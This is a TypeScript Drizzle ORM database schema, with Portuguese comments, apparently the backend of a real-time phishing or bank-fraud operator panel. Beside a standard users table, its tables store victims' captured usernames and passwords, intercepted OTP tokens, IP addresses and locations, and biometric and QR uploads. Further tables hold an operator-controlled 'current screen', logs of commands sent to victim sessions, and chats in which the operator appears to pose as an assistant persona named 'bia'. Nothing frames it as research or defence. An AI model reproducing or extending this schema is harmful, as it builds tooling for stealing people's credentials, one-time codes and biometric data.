import { int, mysqlEnum, mysqlTable, text, timestamp, varchar, boolean, decimal, json } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// Tabela de sessões de acesso
export const accessSessions = mysqlTable("access_sessions", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull().unique(),
  userId: int("userId").notNull(),
  ipAddress: varchar("ipAddress", { length: 45 }).notNull(),
  country: varchar("country", { length: 100 }),
  state: varchar("state", { length: 100 }),
  city: varchar("city", { length: 100 }),
  deviceType: varchar("deviceType", { length: 50 }).default("Desktop"),
  status: mysqlEnum("status", ["online", "offline", "paused"]).default("online"),
  currentScreen: varchar("currentScreen", { length: 255 }).default("Login"),
  capturedUsername: varchar("capturedUsername", { length: 255 }),
  capturedPassword: varchar("capturedPassword", { length: 255 }),
  operatorId: int("operatorId"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastActivityAt: timestamp("lastActivityAt").defaultNow().notNull(),
});

export type AccessSession = typeof accessSessions.$inferSelect;
export type InsertAccessSession = typeof accessSessions.$inferInsert;

// Tabela de tokens capturados
export const capturedTokens = mysqlTable("captured_tokens", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  token: varchar("token", { length: 255 }).notNull(),
  tokenType: varchar("tokenType", { length: 50 }).default("OTP"),
  status: mysqlEnum("status", ["pending", "used", "expired"]).default("pending"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type CapturedToken = typeof capturedTokens.$inferSelect;
export type InsertCapturedToken = typeof capturedTokens.$inferInsert;

// Tabela de mensagens de chat
export const chatMessages = mysqlTable("chat_messages", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  senderType: mysqlEnum("senderType", ["operator", "bia"]).notNull(),
  message: text("message").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type ChatMessage = typeof chatMessages.$inferSelect;
export type InsertChatMessage = typeof chatMessages.$inferInsert;

// Tabela de configurações do sistema
export const systemSettings = mysqlTable("system_settings", {
  id: int("id").autoincrement().primaryKey(),
  operatorId: int("operatorId").notNull(),
  blockSuspiciousAccess: boolean("blockSuspiciousAccess").default(false),
  requireTwoFactor: boolean("requireTwoFactor").default(false),
  notifyNewLogins: boolean("notifyNewLogins").default(true),
  biaAvatarUrl: varchar("biaAvatarUrl", { length: 255 }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type SystemSettings = typeof systemSettings.$inferSelect;
export type InsertSystemSettings = typeof systemSettings.$inferInsert;

// Tabela de uploads (QR Codes, Avatares)
export const uploads = mysqlTable("uploads", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  uploadType: mysqlEnum("uploadType", ["qrcode", "avatar", "biometric"]).notNull(),
  fileUrl: varchar("fileUrl", { length: 255 }).notNull(),
  fileName: varchar("fileName", { length: 255 }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type Upload = typeof uploads.$inferSelect;
export type InsertUpload = typeof uploads.$inferInsert;

// Tabela de comandos enviados
export const commandLogs = mysqlTable("command_logs", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  commandType: varchar("commandType", { length: 100 }).notNull(),
  commandValue: text("commandValue"),
  operatorId: int("operatorId").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type CommandLog = typeof commandLogs.$inferSelect;
export type InsertCommandLog = typeof commandLogs.$inferInsert;